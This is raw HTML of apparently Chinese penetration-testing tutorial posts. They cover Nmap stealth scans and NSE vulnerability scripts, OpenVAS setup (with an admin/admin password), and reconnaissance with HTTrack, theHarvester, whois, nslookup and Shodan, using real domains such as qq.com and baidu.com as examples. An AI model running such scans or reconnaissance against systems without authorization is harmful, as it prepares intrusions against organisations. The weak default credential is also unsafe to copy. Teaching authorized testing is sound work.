-<h4 id="Xmas-Tree扫描"><a href="#Xmas-Tree扫描" class="headerlink" title="Xmas Tree扫描"></a>Xmas Tree扫描</h4><p>之所以叫Xmas Tree扫描，其原因是数据包的FIN、PSH和URG标记置为“on(打开)”。我们把数据包那么多标记被打开的现象描绘为“就像点亮了一棵圣诞树”。Xmas Tree数据包不常用的原因是数据包中的SYN和ACK标记一般不会被打开。</p>
-<p>在TCP的RFC中是这样描述的，如果一个关闭的端口收到的数据包没有置位(打开)SYN、ACK或RST标记，该端口就会发送RST包作为响应。如果开启的端口收到这样的数据包，那么该端口就会忽略该数据包。假定计算机的操作系统完全遵循TCP RFC文档，那么不用完成连接的过程，甚至仅在发起连接的情况下，Nmap就可以断定一个端口的状态。</p>
-<p>要在终端使用Xmas Tree扫描，要在终端输入以下指令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sX -p- -Pn 129.168.190.130</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注：Xmas Tree扫描只针对Unix和Linux系统，对Windows系统不管用。</p>
-</blockquote>
-<h4 id="Null扫描"><a href="#Null扫描" class="headerlink" title="Null扫描"></a>Null扫描</h4><p>Null扫描与Xmas Tree扫描的原理类似，进行Null扫描的命令如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sN -p- -Pn 192.168.190.130</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Nmap脚本引擎"><a href="#Nmap脚本引擎" class="headerlink" title="Nmap脚本引擎"></a>Nmap脚本引擎</h3><p>NSE将Nmap的功能扩展到传统端口扫描之外。<br>为了调用NSE，我们使用”- -script”参数，后面加上参数或脚本名，以及目标IP地址：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script banner 192.168.190.130</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font color="#fb8c00">banner</font>脚本是一个Nmap扩展，创建到TCP端口的一个连接，并将目标系统发送的任何输出打印到本地终端。这在识别隐藏端口上未识别服务极其有用。</li>
-</ul>
-<p>类似地，我们可以使用<font color="#fb8c00">- -script category_name</font>格式调用整组或整个类别的脚本，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script vuln 192.168.190.130</span><br></pre></td></tr></table></figure>
-<ul>
-<li><font color="#fb8c00">vuln</font>将运行在目标系统上搜索已知问题的脚本，这一类别通常只在发现漏洞时提供输出。</li>
-</ul>
-<h3 id="端口扫描总结"><a href="#端口扫描总结" class="headerlink" title="端口扫描总结"></a>端口扫描总结</h3><p>一旦完成端口扫描，就得到了目标计算机上开放端口以及运行的服务的列表。在检查Nmap输出的时候，对端口扫描中发现的所有远程访问服务，我们应尝试登录。</p>
-<h3 id="将Nmap的扫描结果保存为XML文件"><a href="#将Nmap的扫描结果保存为XML文件" class="headerlink" title="将Nmap的扫描结果保存为XML文件"></a>将Nmap的扫描结果保存为XML文件</h3><p>命令语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -oXReport.xml 192.168.190.134</span><br></pre></td></tr></table></figure>
-
-<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>当我们拥有目标计算机的IP地址列表，并且已知这些计算机上开放的端口和已启用的服务之后，就可以开始漏洞扫描。漏洞扫描可以让我们直接跳到第三步：获取系统控制权。</p>
-<h3 id="使用Openvas进行漏洞扫描"><a href="#使用Openvas进行漏洞扫描" class="headerlink" title="使用Openvas进行漏洞扫描"></a>使用Openvas进行漏洞扫描</h3><h4 id="在kali中安装Openvas"><a href="#在kali中安装Openvas" class="headerlink" title="在kali中安装Openvas"></a>在kali中安装Openvas</h4><ol>
-<li><p>更新系统软件包索引：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure></li>
-<li><p><font color="#fb8c00">dist-upgrade</font>命令对系统进行更新，与<font color="#fb8c00">upgrade</font>不同的是，<font color="#fb8c00">dist-upgrade</font>可以根据依赖关系的变化来添加包和删除包</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在kali上安装openvas</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install openvas</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>初始化openvas</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvas-setup</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>向openvas中添加用户名和密码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvasmd --user=admin --new-password=admin</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>在浏览器中访问<font color="#fb8c00"><a href="https://127.0.0.1:9392" target="_blank" rel="noopener">https://127.0.0.1:9392</a></font>打开openvas的一个Web化的控制界面。</p>
-</li>
-</ol>
-<blockquote>
-<p>注：如果已经安装openvas，在终端使用openvas-start命令后访问上述网址即可打开openvas</p>
-</blockquote>
-<h4 id="使用openvas"><a href="#使用openvas" class="headerlink" title="使用openvas"></a>使用openvas</h4><ol>
-<li>选择scan下tasks<br><img src="https://i.postimg.cc/7Z53HCWK/3.png" alt=""></li>
-<li>选择星型图案下的new tasks<br><img src="https://i.postimg.cc/Zq36NGZ3/4.png" alt=""></li>
-<li>选择下图中的标志对靶机进行设置<br><img src="https://i.postimg.cc/26Dh708t/5.png" alt=""></li>
-<li>在弹出的窗口中对靶机的IP地址以及名字进行设置,点击create完成设置<br><img src="https://i.postimg.cc/fLfX2YVR/6.png" alt=""></li>
-<li>在New Task窗口中点击create完成此次漏洞扫描的设置</li>
-<li>点击菜单的scan选项，选择tasks，出现如下图所示界面，红框中的windowsXP即为刚才所创建的扫描，单击右侧绿色按钮开始进行扫描。<br><img src="https://i.postimg.cc/QC67sskL/7.png" alt=""></li>
-<li>扫描过程中status一栏中会变成黄色的request，当扫描完成后，会变成上图中第一栏的蓝色的Done。</li>
-</ol>
-<h4 id="查看openvas的扫描报告"><a href="#查看openvas的扫描报告" class="headerlink" title="查看openvas的扫描报告"></a>查看openvas的扫描报告</h4><ol>
-<li>完成后点击Last一栏的日期，出现如下界面：<br><img src="https://i.postimg.cc/3r9m2CML/8-jp.jpg" alt=""></li>
-</ol>
-<ul>
-<li><font color="#fb8c00">Vulnerability</font>显示的是漏洞名称(单击漏洞名称可以显示该漏洞的详细信息)</li>
-<li><font color="#fb8c00">security</font>显示的是漏洞的威胁级别</li>
-<li><font color="#fb8c00">Host</font>显示的是存在该漏洞的主机</li>
-<li><font color="#fb8c00">Location</font>表示漏洞的端口</li>
-<li>该页面的漏洞级别是根据威胁级别从高到低排列的</li>
-</ul>
-<ol start="2">
-<li><p>可以单击菜单栏的scan选择Results，获得图形化的扫描报告。</p>
-</li>
-<li><p>导出扫描报告：点击菜单栏scan，选择tasks，点击last中的日期，会出现下图界面，单击框中的选项选择导出格式，然后点击后面的绿色按钮进行保存路径选择。(默认保存在Downloads目录中)</p>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://fightingtree.github.io/2019/11/14/penetrationTest3/" data-id="ck5ewyp080033i8tw30bk6irt" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-penetrationTest2" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/11/13/penetrationTest2/" class="article-date">
-  <time datetime="2019-11-13T08:41:09.000Z" itemprop="datePublished">2019-11-13</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E5%AE%89%E5%85%A8/">安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/11/13/penetrationTest2/">渗透测试(2)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>侦察也就是信息收集。在收集目标信息上花的时间越多，后续阶段的成功率就越高。</p>
-<h3 id="侦察步骤"><a href="#侦察步骤" class="headerlink" title="侦察步骤"></a>侦察步骤</h3><ol>
-<li>侦察以彻底地搜索目标的公共信息开始：有些组织把这些信息叫做开源情报(Open-Source Intellgence,OSINT)。这个步骤的好处是，通常不用发送数据包也能收集到海量数据。虽然侦查阶段所用到的用某些工具直接向目标发送信息，但要分清哪些工具会跟目标联络，哪些不会，这点很重要。该步骤有两个任务：</li>
-</ol>
-<ul>
-<li>收集与目标相关的信息，越多越好。</li>
-<li>分类收集所有信息，创建可进行攻击的IP地址或者统一资源定位符(URL)列表。</li>
-</ul>
-<h3 id="制定策略"><a href="#制定策略" class="headerlink" title="制定策略"></a>制定策略</h3><p>若想顺利地进行侦察工作，必须先制定一个策略。典型的策略应包含主动和被动的侦察。</p>
-<ul>
-<li>主动侦察(active recooaissance)包括与目标系统直接交互。在这个过程中，目标可能会记录下我们的IP地址及活动。如果我们试图以隐身的方式进行渗透测试，就更有可能被检测出来。</li>
-<li>被动侦察(passive recooaissance)则可以利用从网上获取的海量信息。当执行被动侦察时，不会直接与目标交互，因此目标不会知道或记录我们的活动。</li>
-</ul>
-<h3 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h3><p>收集信息时，应把数据信息集中保存。可能的话，最好都以电子格式保存。</p>
-<h2 id="HTTrack-网站复制机"><a href="#HTTrack-网站复制机" class="headerlink" title="HTTrack:网站复制机"></a>HTTrack:网站复制机</h2><p>首先要做的是细致浏览目标的网站。</p>
-<ul>
-<li>HTTrack可以将网站逐页复制下来，能够创建与目标网站完全相同的脱机副本。</li>
-<li>复制的内容包括原始网站所有网页、链接、图片和代码，这些文件将储存在你的本地电脑里。</li>
-<li>利用这类网站复制工具，可以在脱机状态下尽情挖掘某个网站的资源，而不用花时间在目标公司的Web服务器上闲逛。</li>
-</ul>
-<blockquote>
-<p>注：只要是属于目标的资源，任何时候与之直接交互，都有可能留下数字指纹(Digital Fingerprint)</p>
-</blockquote>
-<h3 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h3><p>Linux环境下在终端输入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install httrack</span><br></pre></td></tr></table></figure>
-<p>安装完成后使用如下命令运行它：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httrack</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>克隆网站很容易被追踪，同时被视为极具攻击性，没有事先获得授权的话，不要运用此工具！</p>
-<ul>
-<li>在终端启动HTTrack后，该程序将询问一系列基本问题，然后开始复制目标网站。在大部分情况下，你可以一直按回车键接受默认答案。</li>
-<li>成功的复制至少需要输入项目名称和一个有效的URL才能复制。</li>
-<li>完成问题的回答后，输入“Y”开始进行克隆。</li>
-<li>因为我们创建的是网站的精确副本，必须考虑本地计算机上的可用空间，在开始复制之前，必须确保有足够的空间</li>
-</ul>
-<p>不管是把整个网站复制下来还是实时浏览网站，都要关注细节。一开始就应该不断总结记录你在目标网站中找到的信息，比如物理地址、电子邮箱、商业关系(伙伴关系)、员工的姓名、与社会化媒体的联系等等。</p>
-<h3 id="进入被动侦察"><a href="#进入被动侦察" class="headerlink" title="进入被动侦察"></a>进入被动侦察</h3><p>有了目标的基本信息以后，就可以进入被动侦察阶段，被动侦察不会向目标系统发送任何数据包，在被动侦察中，我们所要用到的一个武器是互联网。首先要做的是利用各个搜索引擎对目标进行地毯式地搜索。(推荐使用google)</p>
-<h2 id="The-Harvester：挖掘并利用邮箱地址"><a href="#The-Harvester：挖掘并利用邮箱地址" class="headerlink" title="The Harvester：挖掘并利用邮箱地址"></a>The Harvester：挖掘并利用邮箱地址</h2><ul>
-<li>The Harvester可用于搜索Google/Bing/PGP服务器的电子邮件、主机以及子域名。还能搜索LinkedIn的用户名。</li>
-<li>Kali本身已经内置了The Harvester。</li>
-</ul>
-<h3 id="使用The-Harvester"><a href="#使用The-Harvester" class="headerlink" title="使用The Harvester"></a>使用The Harvester</h3><p>在终端输入以下命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theharvester //启动theharvester,界面会展示相关参数及用法</span><br></pre></td></tr></table></figure>
-
-<p>在终端输入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theharvester -d qq.com -l 10 -b baidu</span><br></pre></td></tr></table></figure>
-<p>上述命令的解释：</p>
-<ul>
-<li><font color="#fb8c00">-d</font> 用来指定目标的域名(qq.com)</li>
-<li><font color="#fb8c00">-l</font> 用来限定搜索结果的数目(10)</li>
-<li><font color="#fb8c00">-b</font> 用来指定进行搜索的公共知识库(baidu)，如果不确定来源，可以选择使用<font color="#fb8c00">-b all</font>，同时搜索Harvester能够使用的知识库。</li>
-</ul>
-<p>以上命令将搜索关于qq.com的电子邮箱、子域名和主机。结果如下：<br><img src="https://i.postimg.cc/v8nCBBpH/1.jpg" alt="">                     <img src="https://i.postimg.cc/FsQ8Jv4b/2.jpg" alt=""><br>如果还想对<font color="#fb8c00">email.qq.com、m.v.qq.com</font>等子域名进行彻底侦察，则将上述命令中的<font color="#fb8c00">qq.com</font>替换成相应域名即可。</p>
-<h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p>利用Whois，可以获取与目标相关的具体信息，包括IP地址，公司DNS主机名以及地址和电话号码等联系信息。</p>
-<h3 id="使用Whois"><a href="#使用Whois" class="headerlink" title="使用Whois"></a>使用Whois</h3><p>在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois target_domain   //target_domain为目标域名</span><br></pre></td></tr></table></figure>
-<p>如果要获取与百度相关的具体信息，则在命令行输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois baidu.com</span><br></pre></td></tr></table></figure>
-<p>所得到的结果如下：<br><img src="https://i.postimg.cc/QxkPQz82/3.jpg" alt=""></p>
-<blockquote>
-<p>注：需要特别留意DNS服务器。即上图中的(Name Server),可用下面所介绍的Host将其转换成IP地址。</p>
-</blockquote>
-<h2 id="Host工具"><a href="#Host工具" class="headerlink" title="Host工具"></a>Host工具</h2><p>做侦察时经常会收集到主机名，而不是IP地址。这时就需要<font color="#fb8c00">host</font>工具将IP地址翻译出来。<br>在终端中输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host target_domain</span><br></pre></td></tr></table></figure>
-<p>如果我们想把之前发现的baidu.com翻译为IP地址，可以在终端输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host baidu.com</span><br></pre></td></tr></table></figure>
-<p>也可以反过来将IP地址翻译为主机名：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host IP_Address</span><br></pre></td></tr></table></figure>
-<p>可以使用以下命令查看Host帮助文档：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man host</span><br></pre></td></tr></table></figure>
-
-<h2 id="从DNS中提取信息"><a href="#从DNS中提取信息" class="headerlink" title="从DNS中提取信息"></a>从DNS中提取信息</h2><ul>
-<li>DNS(Domain Name Server,域名系统)：域名系统（服务）协议（DNS）是一种分布式网络目录服务，主要用于域名与IP 地址的相互转换，以及控制因特网的电子邮件的发送。(源于百度百科)</li>
-<li>DNS是本地网络和互联网的核心组件。它的一个用途就是负责将域名翻译成IP地址。对于人类而言<font color="#fb8c00">google.com</font>比<font color="#fb8c00"><a href="http://74.125.95.105" target="_blank" rel="noopener">http://74.125.95.105</a></font>好记，对于计算机则相反。DNS就在两者中充当翻译。</li>
-<li>DNS想要工作，必须首先掌握网络中每一台电脑的IP地址和对应域名。</li>
-<li>DNS服务器上包含了它所知道的所有设备的IP地址及其对应的域名的记录信息，许多网络部署了多台DNS服务器，以保证冗余或负载平衡。因此，多台DNS服务器之间需要进行信息共享。这个“共享”过程正是通过区域传输(zone transfer)实现的，区域传输通常也叫AXFR，在这个过程中，一台DNS服务器将其所有域名与IP映射发送到另一台DNS服务器。这一过程允许多台DNS服务器保持信息同步。即使我们无法进行区域传输，仍然有必要考察一下被授权范围内的DNS服务器</li>
-</ul>
-<h3 id="NS-Lookup"><a href="#NS-Lookup" class="headerlink" title="NS Lookup"></a>NS Lookup</h3><p>NS Looup是检查DNS的首选工具，这个工具能查询到DNS服务器，并可能获得DNS服务器知道的各种主机的记录。Kali中已经内置了NS Lookup。<br>NS Lookup可以在交互的模式下运行，也就是说，先启动这个程序，然后再输入特定参数使其运行的特点。所以在终端输入如下命令就可运行NS Lookup</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br></pre></td></tr></table></figure>
-<p>运行NS Lookup之后，我们输入以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server 8.8.8.8 //输入想查询的DNS服务器的IP地址</span><br></pre></td></tr></table></figure>
-<p>接着指明所要查询的记录类型。如果只想要查找一般性信息，可以使用关键字<font color="#fb8c00">any</font>，指定类型为任何类型：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">type</span>=any  //一定要注意空格，否则会出错</span><br></pre></td></tr></table></figure>
-<p>如果你想查看DNS服务器的某些特殊信息，比如目标公司处理电子邮件的邮件服务器的IP地址(具体使用方法可以使用<font color="#fb8c00">man nslookup</font>命令查询)，就可以输入：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">type</span>=mx</span><br></pre></td></tr></table></figure>
-<p>假如你想知道百度处理邮件时用的邮件服务器，前面我们通过whois已经发现了百度的DNS服务器，现对其中一个进行操作：<br><img src="https://i.postimg.cc/P556mrFD/4.jpg" alt=""><br>其中最后显示的五项都为百度的邮件服务器。</p>
-<h2 id="筛选信息寻找可攻击的目标"><a href="#筛选信息寻找可攻击的目标" class="headerlink" title="筛选信息寻找可攻击的目标"></a>筛选信息寻找可攻击的目标</h2><p>整理信息时，建议创建一个简易的列表，用来集中记录收集到的IP地址。对于电子邮件地址、主机名称和URL地址等，还应该分别进行维护。仔细整理过手机来的侦察信息并把数据转换为可攻击的目标之后，我们就应该拥有一个IP列表，其中的IP地址就算不属于目标，至少也是相关的。<br>侦察阶段的最后一个是步骤是检查你所创建的IP列表，确认IP列表里的IP地址都在授权范围内。</p>
-<h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p>搜集信息的网站博主推荐Shodan、ZoomEye、FOFA。下面对Shodan进行详细介绍：</p>
-<h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
-<li>Shodan是一个Internet连接设备的搜索引擎。Shodan搜集所有直接连接到Internet上的设备的信息，如果设备直接连接到Internet，则Shodan会查询该设备以获取各种公开可用的信息。</li>
-<li>Shodan的不部分数据来自banner,banner是有关设备上运行的软件的元数据。</li>
-</ul>
-<h4 id="搜索查询基础"><a href="#搜索查询基础" class="headerlink" title="搜索查询基础"></a>搜索查询基础</h4><p>设备运行服务，这些服务就是Shodan所收集的信息。网站托管在运行Web服务的设备上，Shodan将通过与该Web服务对话来收集信息。每个服务的信息都存储在一个名为banner的对象中。banner是Shodan搜集的基本数据单位，其中也包含你想要搜索的信息，一个简单的banner如下所示：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"data"</span>: <span class="string">"Moxa Nport Device</span></span><br><span class="line"><span class="string">            Status: Authentication disabled</span></span><br><span class="line"><span class="string">            Name: NP5232I_4728</span></span><br><span class="line"><span class="string">            MAC: 00:90:e8:47:10:2d"</span>,</span><br><span class="line">    <span class="string">"ip_str"</span>: <span class="string">"46.252.132.235"</span>,</span><br><span class="line">    <span class="string">"port"</span>: 4800,</span><br><span class="line">    <span class="string">"org"</span>: <span class="string">"Starhub Mobile"</span>,</span><br><span class="line">    <span class="string">"location"</span>: &#123;</span><br><span class="line">        <span class="string">"country_code"</span>: <span class="string">"SG"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>上述banner有五个属性，每个属性都代表不同的含义：</p>
-<ul>
-<li><font color="#fb8c00">data</font> 服务本身的主要响应</li>
-<li><font color="#fb8c00">ip_str</font> 设备的IP地址</li>
-<li><font color="#fb8c00">port</font> 服务的端口号</li>
-<li><font color="#fb8c00">org</font> 拥有这个IP空间的组织</li>
-<li><font color="#fb8c00">location</font> 设备所在的位置</li>
-</ul>
-<p>Shodan默认只搜索data属性，data属性的内容因服务类型而不同，比如，下面是一个典型的HTTP banner：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.1.19</span><br><span class="line">Date: Sat, 03 Oct 2015 06:09:24 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 6466</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
-<p>上述信息表示设备运行在版本号为1.1.19的配置Web服务软件上。</p>
-<p>下面是西门子S7工厂控制协议的banner:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Copyright: Original Siemens Equipment</span><br><span class="line">PLC name: S7_Turbine</span><br><span class="line">Module <span class="built_in">type</span>: CPU 313C</span><br><span class="line">Unknown (129): Boot Loader           A</span><br><span class="line">Module: 6ES7 313-5BG04-0AB0  v.0.3</span><br><span class="line">Basic Firmware: v.3.3.8</span><br><span class="line">Module name: CPU 313C</span><br><span class="line">Serial number of module: S Q-D9U083642013</span><br><span class="line">Plant identification: </span><br><span class="line">Basic Hardware: 6ES7 313-5BG04-0AB0  v.0.3</span><br></pre></td></tr></table></figure>
-<p>上述西门子S7协议提供了一个固件的信息。</p>
-<blockquote>
-<p>注：在利用Shodan进行搜索时，你必须先确定要搜索的设备类型，因为不同类型的banner之间的差别很大</p>
-</blockquote>
-<h4 id="搜索语法"><a href="#搜索语法" class="headerlink" title="搜索语法"></a>搜索语法</h4><p>以下述Moxa设备的banner为例：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"data"</span>: <span class="string">"Moxa Nport Device</span></span><br><span class="line"><span class="string">            Status: Authentication disabled</span></span><br><span class="line"><span class="string">            Name: NP5232I_4728</span></span><br><span class="line"><span class="string">            MAC: 00:90:e8:47:10:2d"</span>,</span><br><span class="line">    <span class="string">"ip_str"</span>: <span class="string">"46.252.132.235"</span>,</span><br><span class="line">    <span class="string">"port"</span>: 4800,</span><br><span class="line">    <span class="string">"org"</span>: <span class="string">"Starhub Mobile"</span>,</span><br><span class="line">    <span class="string">"location"</span>: &#123;</span><br><span class="line">        <span class="string">"country_code"</span>: <span class="string">"SG"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>如果你想知道更多关于这个Moxa Nport设备的信息，一个简单的查询可以为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Moxa Nport</span><br></pre></td></tr></table></figure>
-<p>但是，如果你想搜索属于Starhub Mobile组织的所有设备，输入<font color="#fb8c00">Starhub Mobile</font>不会返回预期的结果，这是因为Shodan默认只搜索data属性的内容。</p>
-<h4 id="搜索过滤器"><a href="#搜索过滤器" class="headerlink" title="搜索过滤器"></a>搜索过滤器</h4><p>搜索过滤器是你告诉Shodan具体想要搜索什么信息的关键字，过滤器的组成如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filtername:value   //过滤器名与值之间没有空格</span><br></pre></td></tr></table></figure>
-<p>如果你想搜索在新加坡的所有设备可以使用以下查询：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">country:SG   //country只接收两个字母的国家代码</span><br></pre></td></tr></table></figure>
-<p>如果你想搜索在Starhub Mobile的所有设备可以使用以下查询：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org:<span class="string">"Starhub Mobile"</span>  //如果查询的值之间有空格要使用引号将其包起来</span><br></pre></td></tr></table></figure>
-
-<p>过滤器也可以用来缩小查询范围，如，下面的查询将显示所有属于Starhub Mobile组织并且位于新加坡(城市)的所有设备：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org:<span class="string">"Starhub Mobile"</span> city:Singapore</span><br></pre></td></tr></table></figure>
-
-<h4 id="网站导航"><a href="#网站导航" class="headerlink" title="网站导航"></a>网站导航</h4><p>Shodan网站有三种类型的服务：</p>
-<ol>
-<li>Shodan(<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a>)</li>
-<li>Shodan Maps(<a href="https://maps.shodan.io" target="_blank" rel="noopener">https://maps.shodan.io</a>)</li>
-<li>Shodan Images(<a href="https://images.shodan.io" target="_blank" rel="noopener">https://images.shodan.io</a>)<br>上述网站都访问相同的Shodan数据但是却能达到不同的目的。</li>
-</ol>
-<h5 id="Main-Shodan-Website"><a href="#Main-Shodan-Website" class="headerlink" title="Main Shodan Website"></a>Main Shodan Website</h5><p>访问Shodan收集到的数据的最主要接口，是访问<a href="https://www.shodan.io" target="_blank" rel="noopener">https://www.shodan.io</a> ，搜索默认会查询过去30天内的结果<br>除了搜索，该网站该提供以下功能</p>
-<ol>
-<li>下载数据<br>搜索完成后，可以通过菜单栏的Download Results导出搜索得到的数据(如下图)<br><img src="https://i.postimg.cc/L8QxvKrb/5.jpg" alt=""><br>并且可以导出为不同的文件格式</li>
-</ol>
-<ul>
-<li>JSON文件包含Shodan收集到的整个banner和所有元数据，这是首选的导出文件格式，因为它包含了所有有用信息，并且JSON文件与Shodan命令行客户端兼容，这意味着你可以从Shodan下载数据并利用终端进行进一步加工。</li>
-<li>在你只关心banner基本信息并且需要快速下载这些信息并导出为外部文件(如Excel)时，将数据导出为CSV文件最合适。</li>
-<li>XML文件是被弃用的导出文件格式，除非你有软件必须依赖于XML文件的数据，否则不要使用它<br>下载数据需要消耗export credits(需要进行购买)。</li>
-</ul>
-<ol start="2">
-<li><p>生成报告<br>网站允许你根据查询的结果生成报告，报告通过图表的形式向你展示结果的分布情况。该功能是免费的，可以通过菜单Download Results旁边的Create Report来实现。报告是根据目前的数据生成的，报告一旦生成就不会改变。</p>
-</li>
-<li><p>可以在社区(Explore)与其他人交流分享在Shodan获得的经验与方法。(注意不要分享违法敏感信息)</p>
-</li>
-</ol>
-<blockquote>
